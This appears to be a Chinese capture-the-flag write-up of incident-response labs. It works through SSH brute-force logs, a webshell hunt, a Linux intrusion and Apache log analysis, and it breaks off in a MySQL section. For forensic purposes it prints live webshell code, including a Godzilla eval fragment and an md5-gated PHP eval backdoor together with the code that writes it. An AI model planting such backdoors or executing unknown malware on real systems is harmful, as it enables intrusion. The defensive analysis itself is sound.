logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.32  user=rootAug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2Aug  1 07:42:33 linux-rz sshd[7471]: Connection closed by authenticating user root 192.168.200.32 port 51888 [preauth]Aug  1 07:42:49 linux-rz sshd[7288]: Received disconnect from 192.168.200.2 port 54682:11: disconnected by userAug  1 07:42:49 linux-rz sshd[7288]: Disconnected from user root 192.168.200.2 port 54682Aug  1 07:42:49 linux-rz sshd[7288]: pam_unix(sshd:session): session closed for user rootAug  1 07:42:49 linux-rz systemd-logind[440]: Session 6 logged out. Waiting for processes to exit.Aug  1 07:42:49 linux-rz systemd-logind[440]: Removed session 6.Aug  1 07:46:39 linux-rz sshd[7475]: Invalid user user from 192.168.200.2 port 36149Aug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2Aug  1 07:46:45 linux-rz sshd[7475]: Connection closed by invalid user user 192.168.200.2 port 36149 [preauth]Aug  1 07:46:45 linux-rz sshd[7478]: Invalid user user from 192.168.200.2 port 44425Aug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2Aug  1 07:46:48 linux-rz sshd[7478]: Connection closed by invalid user user 192.168.200.2 port 44425 [preauth]Aug  1 07:46:48 linux-rz sshd[7480]: Invalid user user from 192.168.200.2 port 38791Aug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2Aug  1 07:46:52 linux-rz sshd[7480]: Connection closed by invalid user user 192.168.200.2 port 38791 [preauth]Aug  1 07:46:52 linux-rz sshd[7482]: Invalid user user from 192.168.200.2 port 37489Aug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2Aug  1 07:46:54 linux-rz sshd[7482]: Connection closed by invalid user user 192.168.200.2 port 37489 [preauth]Aug  1 07:46:54 linux-rz sshd[7484]: Invalid user user from 192.168.200.2 port 35575Aug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2Aug  1 07:46:57 linux-rz sshd[7484]: Connection closed by invalid user user 192.168.200.2 port 35575 [preauth]Aug  1 07:46:57 linux-rz sshd[7486]: Invalid user hello from 192.168.200.2 port 35833Aug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2Aug  1 07:46:59 linux-rz sshd[7486]: Connection closed by invalid user hello 192.168.200.2 port 35833 [preauth]Aug  1 07:47:00 linux-rz sshd[7489]: Invalid user hello from 192.168.200.2 port 37653Aug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2Aug  1 07:47:02 linux-rz sshd[7489]: Connection closed by invalid user hello 192.168.200.2 port 37653 [preauth]Aug  1 07:47:02 linux-rz sshd[7491]: Invalid user hello from 192.168.200.2 port 37917Aug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2Aug  1 07:47:05 linux-rz sshd[7491]: Connection closed by invalid user hello 192.168.200.2 port 37917 [preauth]Aug  1 07:47:05 linux-rz sshd[7493]: Invalid user hello from 192.168.200.2 port 41957Aug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2Aug  1 07:47:08 linux-rz sshd[7493]: Connection closed by invalid user hello 192.168.200.2 port 41957 [preauth]Aug  1 07:47:08 linux-rz sshd[7495]: Invalid user hello from 192.168.200.2 port 39685Aug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2Aug  1 07:47:11 linux-rz sshd[7495]: Connection closed by invalid user hello 192.168.200.2 port 39685 [preauth]Aug  1 07:47:11 linux-rz sshd[7497]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:15 linux-rz sshd[7497]: Connection closed by authenticating user root 192.168.200.2 port 34703 [preauth]Aug  1 07:47:16 linux-rz sshd[7499]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Connection closed by authenticating user root 192.168.200.2 port 46671 [preauth]Aug  1 07:47:18 linux-rz sshd[7501]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Connection closed by authenticating user root 192.168.200.2 port 39967 [preauth]Aug  1 07:47:20 linux-rz sshd[7503]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:47:23 linux-rz sshd[7503]: Connection closed by authenticating user root 192.168.200.2 port 46647 [preauth]Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2Aug  1 07:47:23 linux-rz sshd[7505]: pam_unix(sshd:session): session opened for user root by (uid=0)Aug  1 07:47:23 linux-rz systemd-logind[440]: New session 7 of user root.Aug  1 07:47:23 linux-rz sshd[7525]: Invalid user  from 192.168.200.2 port 37013Aug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2Aug  1 07:47:28 linux-rz sshd[7525]: Connection closed by invalid user  192.168.200.2 port 37013 [preauth]Aug  1 07:47:28 linux-rz sshd[7528]: Invalid user  from 192.168.200.2 port 37545Aug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2Aug  1 07:47:30 linux-rz sshd[7528]: Connection closed by invalid user  192.168.200.2 port 37545 [preauth]Aug  1 07:47:30 linux-rz sshd[7530]: Invalid user  from 192.168.200.2 port 39111Aug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2Aug  1 07:47:32 linux-rz sshd[7530]: Connection closed by invalid user  192.168.200.2 port 39111 [preauth]Aug  1 07:47:33 linux-rz sshd[7532]: Invalid user  from 192.168.200.2 port 35173Aug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2Aug  1 07:47:37 linux-rz sshd[7532]: Connection closed by invalid user  192.168.200.2 port 35173 [preauth]Aug  1 07:47:37 linux-rz sshd[7534]: Invalid user  from 192.168.200.2 port 45807Aug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2Aug  1 07:47:41 linux-rz sshd[7534]: Connection closed by invalid user  192.168.200.2 port 45807 [preauth]Aug  1 07:50:29 linux-rz sshd[7505]: pam_unix(sshd:session): session closed for user rootAug  1 07:50:29 linux-rz systemd-logind[440]: Session 7 logged out. Waiting for processes to exit.Aug  1 07:50:29 linux-rz systemd-logind[440]: Removed session 7.Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2Aug  1 07:50:37 linux-rz sshd[7539]: pam_unix(sshd:session): session opened for user root by (uid=0)Aug  1 07:50:37 linux-rz systemd-logind[440]: New session 8 of user root.Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/shAug  1 07:50:52 linux-rz passwd[7563]: pam_unix(passwd:chauthtok): password changed for test2Aug  1 07:50:56 linux-rz sshd[7539]: Received disconnect from 192.168.200.2 port 48070:11: disconnected by userAug  1 07:50:56 linux-rz sshd[7539]: Disconnected from user root 192.168.200.2 port 48070Aug  1 07:50:56 linux-rz sshd[7539]: pam_unix(sshd:session): session closed for user rootAug  1 07:50:56 linux-rz systemd-logind[440]: Session 8 logged out. Waiting for processes to exit.Aug  1 07:50:56 linux-rz systemd-logind[440]: Removed session 8.Aug  1 07:52:57 linux-rz sshd[7606]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.31  user=rootAug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2Aug  1 07:53:01 linux-rz sshd[7606]: Connection closed by authenticating user root 192.168.200.31 port 40364 [preauth]Aug  1 08:01:26 linux-rz sshd[748]: Received disconnect from 192.168.200.2 port 50378:11: disconnected by userAug  1 08:01:26 linux-rz sshd[748]: Disconnected from user root 192.168.200.2 port 50378Aug  1 08:01:26 linux-rz sshd[748]: pam_unix(sshd:session): session closed for user rootAug  1 08:01:26 linux-rz systemd-logind[440]: Session 3 logged out. Waiting for processes to exit.Aug  1 08:01:26 linux-rz systemd-logind[440]: Removed session 3.Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bashAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;adm&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;dialout&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;cdrom&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;floppy&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;sudo&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;audio&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;dip&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;video&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;plugdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;netdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;adm&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;dialout&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;cdrom&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;floppy&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;sudo&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;audio&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;dip&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;video&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;plugdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;netdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 passwd[493]: password for &#x27;debian&#x27; changed by &#x27;root&#x27;Aug  1 08:18:27 ip-172-31-37-190 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.logAug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)Aug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session closed for user rootAug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on 0.0.0.0 port 22.Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event1 (Power Button)Aug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on :: port 22.Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event2 (Sleep Button)Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: New seat seat0.Jul 20 05:18:05 ip-10-0-10-2 passwd[418]: password for &#x27;debian&#x27; changed by &#x27;root&#x27;Jul 20 05:18:05 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event1 (Power Button)Jul 20 05:18:05 ip-10-0-10-2 sshd[452]: Server listening on 0.0.0.0 port 22.Jul 20 05:18:06 ip-10-0-10-2 sshd[452]: Server listening on :: port 22.Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event2 (Sleep Button)Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: New seat seat0.\n\n一个一个找效率太低,我们用grep进行正则匹配\n有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割cat /var/log/auth.log.1|grep -a &quot;Failed password for root&quot;\n\nAug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\n\n把ip列出来\n192.168.200.32192.168.200.2192.168.200.31那么flag就是flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;\n\nssh爆破成功登陆的IP是多少，如果有多个使用”,”分割找Accepted password即可\ncat /var/log/auth.log.1|grep -a &quot;Accepted password for root&quot;\n\nAug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2\n\n那么flag就是\nflag&#123;192.168.200.2&#125;\n\n爆破用户名字典是什么？如果有多个使用”,”分割找登录错误的即可\ncat /var/log/auth.log.1|grep -a &quot;Failed password&quot;\n\nAug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\n\n我们要for到from之间的字符串,再次过滤\ncat /var/log/auth.log.1|grep -a &quot;Failed password&quot;|grep -o &#x27;for .*from&#x27;|uniq -c|sort -nr\n\n      5 for invalid user user from      5 for invalid user hello from      5 for invalid user  from      4 for root from      1 for root from      1 for root from      1 for invalid user test3 from      1 for invalid user test2 from      1 for invalid user test1 fromflag&#123;user,hello,root,test3,test2,test1&#125;\n\n这里sort -nr:\n\n-n：按数字排序（次数）。\n-r：降序排列（最高频次在前）。\n\nuniq -c:统计重复行的次数\n登陆成功的IP共爆破了多少次前面知道只有192.168.200.2登录成功,找他即可\ncat /var/log/auth.log.1|grep -a &quot;192.168.200.2&quot;|grep &quot;for root&quot;\n\nAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2\n\n失败四次,flag{4}\n黑客登陆主机后新建了一个后门用户，用户名是多少cat /var/log/auth.log.1|grep -a &quot;new user&quot;\n\nAug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/shAug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash\n\nflag{test2}\n第一章 应急响应-webshell查杀靶机账号密码 root xjwebshell1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx4.黑客免杀马完整路径 md5 flag&#123;md5&#125;\n\n登进去后先把web目录下的文件dump下来\ntar -czvf html.tar.gz -C /var/www/html \n\n然后用d盾扫一下\n黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}在D:\\Problems\\webshell\\var\\www\\html\\include\\gz.php上找到flag\n\nflag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;\n\n黑客使用的什么工具的shell github地址的md5 flag{md5}直接把如下代码放在github里搜\nif ($data!==false)&#123;    $data=encode($data,$key);    if (isset($_SESSION[$payloadName]))&#123;        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;            $payload=encode($payload,$key);        &#125;\t\teval($payload);        echo encode(@run($data),$key);    &#125;else&#123;        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;            $_SESSION[$payloadName]=encode($data,$key);        &#125;    &#125;&#125;\n\n\n发现是哥斯拉的webshell,github地址为https://github.com/BeichenDream/Godzilla\nflag&#123;39392de3218c333f794befef07ac9257&#125;\n\n黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx\nmysqli.php\n/var/www/html/include/Db/.Mysqli.phpflag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;\n\n黑客免杀马完整路径 md5 flag{md5}id      级别  大小       CRC        修改时间             文件 (说明) -------------------------------------------------------------------------------------------------------------------------------------------- 00001   4     38         FEE1C229   23-08-02 10:52:25    \\html\\shell.php     『Eval后门 &#123;参数:$_REQUEST[1]&#125;』 00002   4     808        3F54B485   23-08-02 10:56:39    \\html\\include\\gz.php  『(内藏)Eval后门 &#123;参数:encode($_SESSION[$payloadName],&quot;3c6e0b8a9c15224a&quot;)&#125;』 00003   3     205        D6CF6AC8   23-08-02 16:56:29    \\html\\wap\\top.php   『变量函数[$c($fun)]|可疑文件』 00004   4     768        3DEFBD91   23-08-02 11:01:06    \\html\\include\\Db\\.Mysqli.php  『(内藏)Eval后门 &#123;参数:encode($_SESSION[$payloadName],&quot;3c6e0b8a9c15224a&quot;)&#125;』\n\n这个是d盾扫出来的\n\n这个是火绒找出来的,差了个top.php\n/var/www/html/wap/top.phpflag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;\n\n第一章 应急响应- Linux入侵排查账号：root 密码：linuxruqinssh root@IP1.web目录存在木马，请找到木马的密码提交2.服务器疑似存在不死马，请找到不死马的密码提交3.不死马是通过哪个文件生成的，请提交文件名4.黑客留下了木马文件，请找出黑客的服务器ip提交5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交\n\ndump下来给火绒查杀\n\nweb目录存在木马，请找到木马的密码提交\nflag&#123;1&#125;\n\n服务器疑似存在不死马，请找到不死马的密码提交创建.符号开头也很明确了，就是为了创建隐藏webshell连接木马\n&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;\n\nPOST传进来的md5的那一大串转为字符串为hello故flag就找到了\nflag&#123;hello&#125;\n\n不死马是通过哪个文件生成的，请提交文件名在index.php里看到这些东西：\n$file = &#x27;/var/www/html/.shell.php&#x27;;$code = &#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;;file_put_contents($file, $code);\n\n很明显就是通过index.php给.shell.php写不死马\nflag&#123;index.php&#125;\n\n黑客留下了木马文件，请找出黑客的服务器ip提交还剩一个shell.elf没处理,linux可执行文件,我们在靶机上尝试执行一下\n发现没有用可执行权限,加上x权限即可\nchmod +x shell\\(1\\).elf #括号转义./shell\\(1\\).elf &amp; # &#x27;&amp;&#x27; 把文件放在后台执行,不阻塞shell\n\n然后netstat -alntup看一下连接情况\n\nflag&#123;10.11.55.21&#125;\n\n黑客留下了木马文件，请找出黑客服务器开启的监端口提交上一题可知\nflag&#123;3333&#125;\n\n第一章 日志分析-apache日志分析1、提交当天访问次数最多的IP，即黑客IP：2、黑客使用的浏览器指纹是什么，提交指纹的md5：3、查看包含index.php页面被访问的次数，提交次数：4、查看黑客IP访问了多少次，提交次数：5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:\n\n提交当天访问次数最多的IP，即黑客IP：错误日志路径在/var/log/apache2/error.log.1下，\n\n直接就能看出ip是192.168.200.2\nflag&#123;192.168.200.2&#125;\n\n黑客使用的浏览器指纹是什么，提交指纹的md5：结合access.log.1里的内容一起看，以时间戳[Thu Aug 03 08:46:44.388147 2023]为例子找到对应\ncat 1.txt | grep -a &quot;08:46:44&quot;\n\n\nflag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;\n\n查看包含index.php页面被访问的次数，提交次数：在access.log.1里直接看\nroot@ip-10-0-10-2:/var/log/apache2# cat 1.txt | grep -a &quot;/index.php&quot; | sort | uniq -c | sort -nr|wc -l27\n\nflag&#123;27&#125;\n\n查看黑客IP访问了多少次，提交次数：grep -Ea &quot;^192.168.200.2 - -&quot; /var/log/apache2/access.log.1 | wc -l6555\n\n\nflag&#123;6555&#125;\n\n查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:grep -Ea &quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot; /var/log/apache2/access.log.1 | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | wc -lroot@ip-10-0-10-3:/var/log/apache2# grep -Ea &quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot; /var/log/apache2/access.log.1 | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | wc -l5\n\nflag&#123;5&#125;\n\n第一章日志分析-mysql应急响应黑客第一次写入的shell在web目录下发现sh.php\n\nflag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;\n\n黑客反弹shell的ip需要到mysql的报错日志下\n/var/log/mysql/error.log\n\n\n发现一个可疑的/tmp/1.sh文件\n\nflag&#123;192.168.100.13&#125;\n\n黑客提权文件的完整路径首先要知道mysql提权的几种方式\n\nUDF 提权\nMOF提权\n启动项提权\nCVE-2016-6663\n\n其中，2，3都是在windows环境下才能进行，故排除，4需要 MariaDB &lt;&#x3D; 5.5.51 或 10.0.x &lt;&#x3D; 10.0.27 或 10.1.x &lt;&#x3D; 10.1.17，而我们环境的 MariaDB 版本为 